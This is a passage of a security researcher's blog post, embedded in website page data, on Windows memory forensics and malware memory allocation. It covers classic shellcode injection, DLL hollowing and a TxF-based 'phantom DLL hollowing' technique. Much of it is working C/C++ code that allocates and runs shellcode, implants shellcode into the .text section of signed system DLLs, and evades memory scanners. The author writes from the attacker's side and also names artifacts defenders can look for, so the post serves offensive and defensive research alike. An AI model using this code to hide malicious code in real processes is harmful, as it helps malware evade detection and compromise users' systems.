memory,” as this term is typically used to refer to all memory which is never shared (not derived from a section). The distinction between mapped and image memory stems from the control area of their foundational section object. In order to give the clearest possible picture of what constitutes legitimate memory allocation I wrote a memory scanner (the PoC for which can be found on Github) which uses the characteristics of the MEMORY_BASIC_INFORMATION structure returned by KERNEL32.DLL!VirtualQuery to statistically calculate the most common permission attributes of each of the three aforementioned memory types across all accessible processes. In the screenshot below I've executed this scanner on an unadulterated Windows 8 VM. Understanding these statistics is not difficult. The majority of private memory is +RW, consistent with its usage in stack and heap allocation. Mapped memory is largely readonly, an aspect which is also intuitive considering that the primary usage of such memory is to map existing .db, .mui and .dat files from disk into memory for the application to read. Most notably from the perspective of a malware writer is that executable memory is almost exclusively the domain of image mappings. In particular +RX regions (as opposed to +RWX) which correspond to the .text sections of DLL modules loaded into active processes. In Figure 2, taken from the memory map of an explorer.exe process, image memory is shown split into multiple separate regions. Those corresponding to the PE header and subsequent sections, along with a predictable set of permissions (+RX for .text, +RW for .data, +R for .rsrc and so forth). The Info field is actually an abstraction of x64dbg and not a characteristic of the memory itself: x64dbg has walked the PEB loaded module list searching for an entry with a base address that matches the region base, and then set the Info for its PE headers to the module name, and each subsequent region within the map has had its Info set to its corresponding IMAGE_SECTION_HEADER.Name, as determined by calculating which regions correspond to each mapped image base + IMAGE_SECTION_HEADER.VirtualAddress. Classic malware memory allocation Malware writers have a limited set of tools in their arsenal to allocate executable memory for their code. This operation is however essential to process injection, process hollowing and packers\u002Fcrypters. In brief, the classic technique for any form of malicious code allocation involved using NTDLL.DLL!NtAllocateVirtualMemory to allocate a block of +RWX permission memory and then writing either a shellcode or full PE into it, depending on the genre of attack. uint8_t* pShellcodeMemory = (uint8_t*)VirtualAlloc( nullptr, dwShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(pShellcodeMemory, Shellcode, dwShellcodeSize); CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)pShellcodeMemory, nullptr, 0, nullptr); Later this technique evolved as both attackers and defenders increased in sophistication, leading malware writers to use a combination of NTDLL.DLL!NtAllocateVirtualMemory with +RW permissions and NTDLL.DLL!NtProtectVirtualMemory after the malicious code had been written to the region to set it to +RX before execution. In the case of process hollowing using a full PE rather than a shellcode, attackers begun correctly modifying the permissions of +RW memory they allocated for the PE to reflect the permission characteristics of the PE on a per-section basis. The benefit of this was twofold: no +RWX memory was allocated (which is suspicious in of itself) and the VAD entry for the malicious region would still read as +RW even after the permissions had been modified, further thwarting memory forensics. uint8_t* pShellcodeMemory = (uint8_t*)VirtualAlloc( nullptr, dwShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE); memcpy(pShellcodeMemory, Shellcode, dwShellcodeSize); VirtualProtect( pShellcodeMemory, dwShellcodeSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect); CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)pShellcodeMemory, nullptr, 0, nullptr); More recently, attackers have transitioned to an approach of utilizing sections for their malicious code execution. This is achieved by first creating a section from the page file which will hold the malicious code. Next the section is mapped to the local process (and optionally a remote one as well) and directly modified. Changes to the local view of the section will also cause remote views to be modified as well, thus bypassing the need for APIs such as KERNEL32.DLL!WriteProcessMemory to write malicious code into remote process address space. LARGE_INTEGER SectionMaxSize = { 0,0 }; NTSTATUS NtStatus SectionMaxSize.LowPart = dwShellcodeSize; NtStatus = NtCreateSection( &hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &SectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); if (NT_SUCCESS(NtStatus)) { NtStatus = NtMapViewOfSection( hSection, GetCurrentProcess(), (void **)&pShellcodeMemory, NULL, NULL, NULL, &cbViewSize, 2, NULL, PAGE_EXECUTE_READWRITE); if (NT_SUCCESS(NtStatus)) { memcpy(pShellcodeMemory, Shellcode, dwShellcodeSize); CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)pShellcodeMemory, nullptr, 0, nullptr); } } While this has the benefit of being (at present) slightly less common than direct virtual memory allocation with NTDLL.DLL!NtAllocateVirtualMemory, it creates similar malicious memory artifacts for defenders to look out for. One key difference between the two methods is that NTDLL.DLL!NtAllocateVirtualMemory will allocate private memory, whereas mapped section views will allocate mapped memory (shared section memory with a data control area). While a malware writer may avoid the use of suspicious (and potentially monitored) APIs such as NTDLL.DLL!NtAllocateVirtualMemory and NTDLL.DLL!NtProtectVirtualMemory the end result in memory is ultimately quite similar with the key difference being the distinction between a MEM_MAPPED and MEM_PRIVATE memory type assigned to the shellcode memory. DLL hollowing With these concepts in mind, it's clear that masking malware in memory means utilizing +RX image memory, in particular the .text section of a mapped image view. The primary caveat to this is that such memory cannot be directly allocated, nor can existing memory be modified to mimic these attributes. Only the PTE which stores the active page permissions is mutable, while the VAD and section object control area which mark the region as image memory and associate it to its underlying DLL on disk are immutable. For this reason, properly implementing a DLL hollowing attack implies infection of a mapped view generated from a real DLL file on disk. Such DLL files should have a .text section with a IMAGE_SECTION_HEADER.Misc.VirtualSize greater than or equal to the size of the shellcode being implanted, and should not yet be loaded into the target process as this implies their modification could result in a crash. GetSystemDirectoryW(SearchFilePath, MAX_PATH); wcscat_s(SearchFilePath, MAX_PATH, L\"\\\\*.dll\"); if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) { do { if (GetModuleHandleW(Wfd.cFileName) == nullptr) { ... } } while (!bMapped && FindNextFileW(hFind, &Wfd)); FindClose(hFind); } In this code snippet I’ve enumerated files with a .dll extension in system32 and am ensuring they are not already loaded into my process using KERNEL32.DLL!GetModuleFileNameW, which walks the PEB loaded modules list and returns their base address (the same thing as their module handle) if a name match is found. In order to create a section from the image I first need to open a handle to it. I’ll discuss TxF in the next section, but for the sake of this code walkthrough we can assume KERNEL.DLL!CreateFileW is used. Upon opening this handle I can read the contents of the PE and validate its headers, particularly its IMAGE_SECTION_HEADER.Misc.VirtualSize field which indicates a sufficient size for my shellcode. uint32_t dwFileSize = GetFileSize(hFile, nullptr); uint32_t dwBytesRead = 0; pFileBuf = new uint8_t[dwFileSize]; if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)& dwBytesRead, nullptr)) { SetFilePointer(hFile, 0, nullptr, FILE_BEGIN); IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf; IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr-\u003Ee_lfanew); IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)& pNtHdrs-\u003EOptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER)); if (pNtHdrs-\u003EOptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) { if (dwReqBufSize \u003C pNtHdrs-\u003EOptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs-\u003EName, \".text\") == 0 && dwReqBufSize \u003C pSectHdrs-\u003EMisc.VirtualSize)) ... } } ... } When a valid PE is found a section can be created from its file handle, and a view of it mapped to the local process memory space. HANDLE hSection = nullptr; NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile); if (NT_SUCCESS(NtStatus)) { *pqwMapBufSize = 0; NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); ... } The unique characteristic essential to this technique is the use of the SEC_IMAGE flag to NTDLL.DLL!NtCreateSection. When this flag is used, the initial permissions parameter is ignored (all mapped images end up with an initial allocation permission of +RWXC). Also worth noting is that the PE itself is validated by NTDLL.DLL!NtCreateSection at this stage, and if it is invalid in any way NTDLL.DLL!NtCreateSection will fail (typically with error 0xc0000005). Finally, the region of memory corresponding to the .text section in the mapped view can be modified and implanted with the shellcode. *ppMappedCode = *ppMapBuf + pSectHdrs-\u003EVirtualAddress + dwCodeRva; if (!bTxF) { uint32_t dwOldProtect = 0; if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)& dwOldProtect)) { memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize); if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)& dwOldProtect)) { bMapped = true; } } } else { bMapped = true; } Once the image section has been generated and a view of it has been mapped into the process memory space, it will share many characteristics in common with a module legitimately loaded via NTDLL.DLL!LdrLoadDll but with several key differences: Relocations will be applied, but imports will not yet be resolved. The module will not have been added to the loaded modules list in usermode process memory. The loaded modules list is referenced in the LoaderData field of the PEB: typedef struct _PEB { BOOLEAN                 InheritedAddressSpace; \u002F\u002F 0x0 BOOLEAN                 ReadImageFileExecOptions; \u002F\u002F 0x1 BOOLEAN                 BeingDebugged; \u002F\u002F 0x2 BOOLEAN                 Spare; \u002F\u002F 0x3 #ifdef _WIN64 uint8_t                    Padding1[4]; #endif HANDLE                  Mutant; \u002F\u002F 0x4 \u002F 0x8 void *                  ImageBase; \u002F\u002F 0x8 \u002F 0x10 PPEB_LDR_DATA           LoaderData; \u002F\u002F 0xC \u002F 0x18 ... } There are three such lists, all representing the same modules in a different ordering. typedef struct _LDR_MODULE { LIST_ENTRY              InLoadOrderModuleList; LIST_ENTRY              InMemoryOrderModuleList; LIST_ENTRY              InInitializationOrderModuleList; void *                  BaseAddress; void *                  EntryPoint; ULONG                   SizeOfImage; UNICODE_STRING          FullDllName; UNICODE_STRING          BaseDllName; ULONG                   Flags; SHORT                   LoadCount; SHORT                   TlsIndex; LIST_ENTRY              HashTableEntry; ULONG                   TimeDateStamp; } LDR_MODULE, *PLDR_MODULE; typedef struct _PEB_LDR_DATA { ULONG                   Length; ULONG                   Initialized; void *                  SsHandle; LIST_ENTRY              InLoadOrderModuleList; LIST_ENTRY              InMemoryOrderModuleList; LIST_ENTRY              InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; It’s important to note that to avoid leaving suspicious memory artifacts behind, an attacker should add their module to all three of the lists. In Figure 3 (shown below) I’ve executed my hollower PoC without modifying the loaded modules list in the PEB to reflect the addition of the selected hollowing module (aadauthhelper.dll). Using x64dbg to view the memory allocated for the aadauthhelper.dll base at 0x00007ffd326a0000 we can see that despite its IMG tag, it looks distinctly different from the other IMG module memory surrounding it. This is because the association between a region of image memory and its module is inferred rather than explicitly recorded. In this case, x64dbg is scanning the aforementioned PEB loaded modules list for an entry with a BaseAddress of 0x00007ffd326a0000 and upon not finding one, does not associate a name with the region or associate its subsections with the sections from its PE header. Upon adding aadauthhelper.dll to the loaded modules lists, x64dbg shows the region as if it corresponded to a legitimately loaded module. Comparing this artificial module (implanted with shellcode) with a legitimately loaded aadauthhelper.dll we can see there is no difference from the perspective of a memory scanner. Only once we view the .text sections in memory and compare them between the legitimate and hollowed versions of aadauthhelper.dll can we see the difference. Phantom hollowing DLL hollowing does in of itself represent a major leap forward in malware design. Notably though, the +RX characteristic of the .text section conventionally forces the attacker into a position of manually modifying this region to be +RW using an API such as NTDLL.DLL!NtProtectVirtualMemory after it has been mapped, writing their shellcode to it and then switching it back to +RX prior to execution. This sets off two different alarms for a sophisticated defender to pick up on: Modification of the permissions of a PTE associated with image memory after it has already been mapped using an API such as NTDLL.DLL!NtProtectVirtualMemory. A new private view of the modified image section being created within the afflicted process memory space. While the first alarm is self-explanatory the second merits further consideration. It may be noted in Figure 2 that the initial allocation permissions of all image related memory is +RWXC, or PAGE_EXECUTE_WRITECOPY. By default, mapped views of image sections created from DLLs are shared as a memory optimization by Windows. For example, only one copy of kernel32.dll will reside in physical memory but will be shared throughout the virtual address space of every process via a shared section object. Once the mapped view of a shared section is modified, a unique (modified) copy of it will be privately stored within the address space of the process which modified it. This characteristic provides a valuable artifact for defenders who aim to identify modified regions of image memory without relying on runtime interception of modifications to the PTE. In Figure 6 above, it can be clearly seen that the substantial majority of aadauthhelper.dll in memory is shared, as is typical of mapped image memory. Notably though, two regions of the image address space (corresponding to the .data and .didat sections) have two private pages associated with them. This is because these sections are writable, and whenever a previously unmodified page within their regions is modified it will be made private on a per-page basis. After allowing my hollower to change the protections of the .text section and infect a region with my shellcode, 4K (the default size of a single page) within the .text sections is suddenly marked as private rather than shared. Notably, however many bytes of a shared region are modified (even if it is only one byte) the total size of the affected region will be rounded up to a multiple of the default page size. In this case, my shellcode was 784 bytes which was rounded up to 0x1000, and a full page within .text was made private despite a considerably smaller number of shellcode bytes being written. Thankfully for us attackers, it is indeed possible to modify an image of a signed PE without changing its contents on disk, and prior to mapping a view of it into memory using transacted NTFS (TxF). Originally designed to provide easy rollback functionality to installers, TxF was implemented in such a way by Microsoft that it allows for complete isolation of transacted data from external applications (including AntiVirus). Therefore if a malware writer opens a TxF file handle to a legitimate Microsoft signed PE file on disk, he can conspicuously use an API such as NTDLL.DLL!NtWriteFile to overwrite the contents of this PE while never causing the malware to be scanned when touching disk (as he has not truly modified the PE on disk). He then has a phantom file handle referencing a file object containing malware which can be used the same as a regular file handle would, with the key difference that it is backed by an unmodified and legitimate\u002Fsigned file of his choice. As previously discussed, NTDLL.DLL!NtCreateSection consumes a file handle when called with SEC_IMAGE, and the resulting section may be mapped into memory using NTDLL.DLL!NtMapViewOfSection. To the great fortune of the malware writer, these may be transacted file handles, effectively providing him a means of creating phantom image sections. The essence of phantom DLL hollowing is that an attacker can open a TxF handle to a Microsoft signed DLL file on disk, infect its .text section with his shellcode, and then generate a phantom section from this malware-implanted image and map a view of it to the address space of a process of his choice. The file object underlying the mapping will still point back to the legitimate Microsoft signed DLL on disk (which has not changed) however the view in memory will contain his shellcode hidden in its .text section with +RX permissions. NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr); hFile = CreateFileTransactedW(FilePath, GENERIC_WRITE | GENERIC_READ, \u002F\u002F The permission to write to the DLL on disk is required even though we technically aren't doing this. 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr); ... memcpy(pFileBuf + pSectHdrs-\u003EPointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize); if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)& dwBytesWritten, nullptr)) { HANDLE hSection = nullptr; NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile); if (NT_SUCCESS(NtStatus)) { *pqwMapBufSize = 0; NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); } } Notably in the snippet above, rather than using the .text IMAGE_SECTION_HEADER.VirtualAddress to identify the infection address of my shellcode I am using IMAGE_SECTION_HEADER.PointerToRawData. This is due to the fact that although I am not writing any content to disk, the PE file is still technically physical in the sense that it has not yet been mapped in to memory. Most relevant in the side effects of this is the fact that the sections will begin at IMAGE_OPTIONAL_HEADER.FileAlignment offsets rather than IMAGE_OPTIONAL_HEADER.SectionAlignment offsets, the latter of which typically corresponds to the default page size. The only drawback of phantom DLL hollowing is that even though we are not writing to the image we are hollowing on disk (which will typically be protected In System32 and unwritable without admin and UAC elevation) in order to use APIs such as NTDLL.DLL!NtWriteFile to write malware to phantom files, one must first open a handle to its underlying file on disk with write permissions. In the case of an attacker who does not have sufficient privileges to create their desired TxF handle, a solution is to simply copy a DLL from System32 to the malware’s application directory and open a writable handle to this copy. The path of this file is less stealthy to a human analyst, however from a program’s point of view the file is still a legitimate Microsoft signed DLL and such DLLs often exist in many directories outside of System32, making an automated detection without false positives much more difficult. Another important consideration with phantom sections is that it is not safe to modify the .text section at an arbitrary offset. This is because a .text section within an image mapped to memory will look different from its equivalent file on disk, and because it may contain data directories whose modification will corrupt the PE. When relocations are applied to the PE, this will cause all of the absolute addresses within the file to be modified (re-based) to reflect the image base selected by the OS, due to ASLR. If shellcode is written to a region of code containing absolute address references, it will cause the shellcode to be corrupted when NTDLL.DLL!NtMapViewOfSection is called. bool CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA) { IMAGE_BASE_RELOCATION * pCurrentRelocBlock; uint32_t dwRelocBufOffset, dwX; bool bWithinRange = false; for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION *)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock-\u003ESizeOfBlock; dwX++) { uint32_t dwNumBlocks = ((pCurrentRelocBlock-\u003ESizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) \u002F sizeof(uint16_t)); uint16_t *pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION)); for (uint32_t dwY = 0; dwY \u003C dwNumBlocks; dwY++, pwCurrentRelocEntry++) { #ifdef _WIN64 #define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_DIR64 #else #define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW #endif if (((*pwCurrentRelocEntry \u003E\u003E 12) & RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) { uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock-\u003EVirtualAddress + (*pwCurrentRelocEntry & 0x0FFF)); if (dwRelocEntryRefLocRva \u003E= dwStartRVA && dwRelocEntryRefLocRva \u003C dwEndRVA) { bWithinRange = true; } } } dwRelocBufOffset += pCurrentRelocBlock-\u003ESizeOfBlock; pCurrentRelocBlock = (IMAGE_BASE_RELOCATION *)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock-\u003ESizeOfBlock); } return bWithinRange; } In the code above, a gap of sufficient size is identified within our intended DLL image by walking the base relocation data directory. Additionally, as previously mentioned NTDLL.DLL!NtCreateSection will fail if an invalid PE is used as a handle for SEC_IMAGE initialization. In many Windows DLLs, data directories (such as TLS, configuration data, exports and others) are stored within the .text section itself. This means that by overwriting these data directories with a shellcode implant, we may invalidate existing data directories, thus corrupting the PE and causing NTDLL.DLL!NtCreateSection to fail. for (uint32_t dwX = 0; dwX \u003C pNtHdrs-\u003EOptionalHeader.NumberOfRvaAndSizes; dwX++) { if (pNtHdrs-\u003EOptionalHeader.DataDirectory[dwX].VirtualAddress \u003E= pSectHdrs-\u003EVirtualAddress && pNtHdrs-\u003EOptionalHeader.DataDirectory[dwX].VirtualAddress \u003C (pSectHdrs-\u003EVirtualAddress + pSectHdrs-\u003EMisc.VirtualSize)) { pNtHdrs-\u003EOptionalHeader.DataDirectory[dwX].VirtualAddress = 0; pNtHdrs-\u003EOptionalHeader.DataDirectory[dwX].Size = 0; } } In the code above I am wiping data directories that point within the .text section. A more elegant solution is to look for gaps between the data directories in .text, similar to how I found gaps within the relocations. However, this is less simple than it sounds, as many of these directories themselves contain references to additional data directories (load config is a good example, which contains many RVA which may also fall within .text). For the purposes of this PoC I’ve simply wiped conflicting data directories. Since the module will never be run, doing so will not affect its execution nor will it affect ours since we are using a PIC shellcode. Last thoughts Attackers have long been overdue for a major shift and leap forward in their malware design, particularly in the area of memory forensics. I believe that DLL hollowing is likely to become a ubiquitous characteristic of malware memory allocation over the next several years, and this will prompt malware writers to further refine their techniques and adopt my method of phantom DLL hollowing, or new (and still undiscovered) methods of thwarting analysis of PE images in memory vs. on disk. Until such a time that innovations in theory are called for, I believe it is more valuable to focus on practical solutions to existing defensive technology. For this reason, in my next post in this series I will discuss bypasses for defensive scanners such as Get-InjectedThread, Malfind and Hollowfind.","coverImage":{"shouldRender":true,"imageMetadata":{"id":"c1d8f6_eecf5699090e4b4096fefc5fa49a2503~mv2.jpg","original_file_name":"c1d8f6_eecf5699090e4b4096fefc5fa49a2503~mv2.jpg","file_name":"c1d8f6_eecf5699090e4b4096fefc5fa49a2503~mv2.jpg","width":761,"height":900},"src":{"id":"c1d8f6_eecf5699090e4b4096fefc5fa49a2503~mv2.jpg","original_file_name":"c1d8f6_eecf5699090e4b4096fefc5fa49a2503~mv2.jpg","file_name":"c1d8f6_eecf5699090e4b4096fefc5fa49a2503~mv2.jpg","width":761,"height":900},"isEnabled":true,"isCustom":false,"isResolved":true},"slug":"malicious-memory-artifacts-part-i-dll-hollowing","isLiked":false,"owner":{"_id":"5d93ba86d7041a0017564e20","name":"forrestorr","image":{"original_file_name":"c1d8f6_f9b6cb79835149268cb5b9d08689bd49~mv2.jpg","file_name":"c1d8f6_f9b6cb79835149268cb5b9d08689bd49~mv2.jpg","width":1008,"height":1024},"cover":null,"siteMemberId":"c1d8f646-2e7f-4989-bd55-0f3142c74189","isOwner":true,"isBlocked":false,"appStore":{"14bcded7-0066-7c35-14d7-466cb3f09103":{"permissions":{"role":"owner"}}},"slug":"forrestorr"},"isSubscribed":false,"readTime":14}},"routing":{"locationBeforeTransitions":{"pathname":"\u002Fcustom-feed-widget","search":"","hash":"","action":"POP","key":null,"query":{}}},"searchParams":{"cacheKiller":"1576009762055","compId":"comp-j9fhq50n","currency":"USD","deviceType":"desktop","height":"401","instance":"fhxESrDk656GD63FNkqn6bDB9iFnMgDdORpmRGwJ1tc.eyJpbnN0YW5jZUlkIjoiNzhlNzI3ODAtZWMxYS00ZTQzLTk3YzEtMjE3Yzc5ZDU1ZTJmIiwiYXBwRGVmSWQiOiIxNGJjZGVkNy0wMDY2LTdjMzUtMTRkNy00NjZjYjNmMDkxMDMiLCJtZXRhU2l0ZUlkIjoiYWM2ZjcyMzUtZDFiYS00ZTYzLTkxYzUtZGU0ZWY4MjA1ZTgwIiwic2lnbkRhdGUiOiIyMDE5LTEyLTEwVDIwOjQzOjU3Ljk3NFoiLCJkZW1vTW9kZSI6ZmFsc2UsIm9yaWdpbkluc3RhbmNlSWQiOiI2OGZhZTk2OC01N2VhLTQyYjctOTE2Zi02MTM2MDRmM2FhNmEiLCJhaWQiOiJjZWVmYzEwOS04ZmJjLTQzYzEtODBlMS1mZjNhNDRlMDMyNzAiLCJiaVRva2VuIjoiZDQ4ODU1YjUtM2RhMC0wMDIwLTA2MDQtZmYzMjgxZjUwMGFmIiwic2l0ZU93bmVySWQiOiJjMWQ4ZjY0Ni0yZTdmLTQ5ODktYmQ1NS0wZjMxNDJjNzQxODkifQ","locale":"en","pageId":"rfpiu","siteRevision":"48","tz":"America\u002FNew_York","viewMode":"site","width":"980"},"users":{},"viewMode":"site"};
+          window.__CONFIG__ = {"bundleName":"custom-feed-widget","fedopsAppName":"communities-blog-custom-feed-widget","imageHost":"static.wixstatic.com","videoHost":"video.wixstatic.com","sectionUrl":"https:\u002F\u002Fwww.forrest-orr.net\u002Fblog","instanceId":"78e72780-ec1a-4e43-97c1-217c79d55e2f","duplexer":{"url":"social-blog.wix.com\u002F_api\u002Fwix-duplexer-sockets-server","key":"8dd942aa-6255-4bb0-b004-8bd6cf2f6b35"},"isInEditor":false,"isInPreview":false,"categoryPath":"categories","useCategoryMenuLabelForMetadataTitle":false,"editorConfig":{"enableLinkify":true,"mediaToken":null},"isDevMode":false,"ampBaseUrl":false,"postPageSectionUrl":"https:\u002F\u002Fwww.forrest-orr.net\u002Fpost"};
+          window.__INITIAL_I18N__ = {"localeData":{"account-suspended.account-suspended":"Account Suspended","account-suspended.contact-owner":"For further information get in touch with the site owner.","badge.admin":"Admin","badge.owner":"Admin","badge.editor":"Editor","badge.writer":"Writer","comment-count.label_plural":"{{count, number}} comments","comment-count.label":"{{count, number}} comment","counter.count":"{{count, number}}","date":"{{time, date}}","fullDate":"{{time, fullDate}}","like-button.is-liked":"Post marked as liked","like-button.is-unliked":"Post not marked as liked","like-button.total-likes_plural":"likes.","like-button.total-likes":"like.","no-posts-feed.on-the-way":"Posts Are Coming Soon","no-posts-feed.stay-tuned":"Stay tuned...","time-relative":"{{time, timeRelative}}","time-to-read.label":"{{minutes}} min read","time-to-read.short-label":"{{minutes}} min","video-embed.disabled-tooltip":"To play this video, view this post from your live site.","video-embed.load-video":"Load video","view-count.label_plural":"{{count, number}} views","view-count.label":"{{count, number}} view","write-comment.write-a-comment":"Write a comment","comment-count.icon-aria-label":"Comment count","like-button.comment-is-liked":"Comment marked as liked","like-button.comment-is-unliked":"Comment not marked as liked","aria-label.authors-picture":"Author's picture"},"lang":"en"};
+          window.__STATICS_VERSION__ = '1.1610.0';
+          window.__WS_CONFIG__ = {"url":"https:\u002F\u002Fforums.wix.com\u002Fwix-ws-server","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbnN0YW5jZUlkIjoiNzhlNzI3ODAtZWMxYS00ZTQzLTk3YzEtMjE3Yzc5ZDU1ZTJmIiwiYXBpS2V5IjoiNTQ3NmQ5MjMtYWVmMy00NjMxLWFhM2ItODg4NjBmYmUxYjg4IiwiY2hhbm5lbHMiOlt7Im1hc2siOiJpbnN0YW5jZS03OGU3Mjc4MC1lYzFhLTRlNDMtOTdjMS0yMTdjNzlkNTVlMmYvYmxvZyIsInJlcXVpcmVzQXV0aCI6bnVsbCwicmVjZWl2ZU93bk1lc3NhZ2VzIjpmYWxzZX0seyJtYXNrIjoiaW5zdGFuY2UtNzhlNzI3ODAtZWMxYS00ZTQzLTk3YzEtMjE3Yzc5ZDU1ZTJmL2NhdGVnb3J5LShcXHcpIiwicmVxdWlyZXNBdXRoIjpudWxsLCJyZWNlaXZlT3duTWVzc2FnZXMiOmZhbHNlfSx7Im1hc2siOiJpbnN0YW5jZS03OGU3Mjc4MC1lYzFhLTRlNDMtOTdjMS0yMTdjNzlkNTVlMmYvcG9zdC0oXFx3KSIsInJlcXVpcmVzQXV0aCI6bnVsbCwicmVjZWl2ZU93bk1lc3NhZ2VzIjpmYWxzZX1dLCJwcmVzZW5jZURhdGEiOnsibmFtZSI6ImFub255bW91cyJ9LCJpYXQiOjE1NzYwMTA2NDB9.eS7aeTvW61nxalSnLpcWbhJiYJ0QrOXhFA3TxPbeONY","communityToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbnN0YW5jZUlkIjoiNzhlNzI3ODAtZWMxYS00ZTQzLTk3YzEtMjE3Yzc5ZDU1ZTJmIiwiYXBpS2V5IjoiYzhmZWZlZDctNjVmNi00Mzc4LWJiZDQtMjAzZTI1NmUzNmIwIiwiY2hhbm5lbHMiOlt7Im1hc2siOiJjb21tdW5pdHktdW5kZWZpbmVkIiwicmVxdWlyZXNBdXRoIjpudWxsLCJyZWNlaXZlT3duTWVzc2FnZXMiOmZhbHNlfV0sInByZXNlbmNlRGF0YSI6eyJuYW1lIjoiYW5vbnltb3VzIn0sImlhdCI6MTU3NjAxMDY0MH0.zq6AiQsyBj0CFlv3KxyEOhxpbXiAPxU2vEc4J76z0JU"};
+          window.__LOCALE__ = "en";
+          window.__BASE_PATH__ = 'https://social-blog.wix.com';
+          window.__API_BASE_URL__ = 'https://apps.wix.com/_api/communities-blog-node-api';
+          window.__CLIENT_BASE_PATH__ = '';
+          window.__IS_DEV_MODE__ = false;
+        </script>
+      
+    
+  
+
+</body></html>
